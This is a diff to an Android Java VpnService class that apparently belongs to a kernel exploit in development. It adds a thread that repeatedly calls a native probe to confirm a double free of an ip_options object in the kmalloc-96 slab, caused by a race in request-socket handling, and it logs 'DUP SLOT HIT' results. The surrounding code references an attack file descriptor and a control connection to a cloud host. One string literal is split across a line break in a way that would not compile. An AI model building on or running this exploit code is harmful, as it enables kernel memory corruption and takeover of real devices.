@@ -272,6 +272,10 @@ public class InjService extends VpnService {
             attackAcceptor.setDaemon(true);
             attackAcceptor.start();
 
+            Thread dupWatch = new Thread(this::dupWatchLoop, "tun-dup");
+            dupWatch.setDaemon(true);
+            dupWatch.start();
+
             control = new Socket();
             control.connect(new InetSocketAddress(CLOUD_HOST, CLOUD_PORT), CONNECT_TIMEOUT_MS);
             control.setTcpNoDelay(true);
@@ -1014,6 +1018,55 @@ int[] fds = snapshotChildFds();
             }
         } catch (Exception e) {
             Log.w(TAG, "drain loop ended: " + e);
+        }
+    }
+
+    /**
+     * Poll for a duplicated slab slot.
+     *
+     * When two cpus take the same request socket, the loser's child is inserted
+     * into no hash table at all: inet_ehash_nolisten destroys it, which frees
+     * its ip_options object, and the request socket still holds the same
+     * pointer and frees it again later. The freed slot therefore appears twice
+     * in the kmalloc-96 freelist, and two of the allocations below land on the
+     * same address.
+     *
+     * Each socket stamps its own index into the option bytes it installs. If
+     * any socket reads back a different index, its memory was handed out twice
+     * and we have proof the double free ran.
+     */
+    private void dupWatchLoop() {
+        int tag = 0x1000;
+        long total = 0;
+        while (running.get()) {
+            try {
+                if (attackFd < 0) {
+                    Thread.sleep(400);
+                    continue;
+                }
+                int found = Native.dupProbe(256, tag++);
+                if (found > 0) {
+                    total += found;
+                    Log.i(TAG, "DUP SLOT HIT found=" + found + " total=" + total);
+                    try {
+                        java.io.File f = new java.io.File(getExternalFilesDir(null), "dup.txt");
+                        java.io.FileOutputStream fo = new java.io.FileOutputStream(f, true);
+                        fo.write(("hit " + found + " tag=" + tag + "
+").getBytes("UTF-8"));
+                        fo.close();
+                    } catch (Exception ignored) {
+                    }
+                }
+                Thread.sleep(50);
+            } catch (InterruptedException e) {
+                break;
+            } catch (Throwable t) {
+                try {
+                    Thread.sleep(200);
+                } catch (InterruptedException ignored) {
+                    break;
+                }
+            }
         }
     }
 
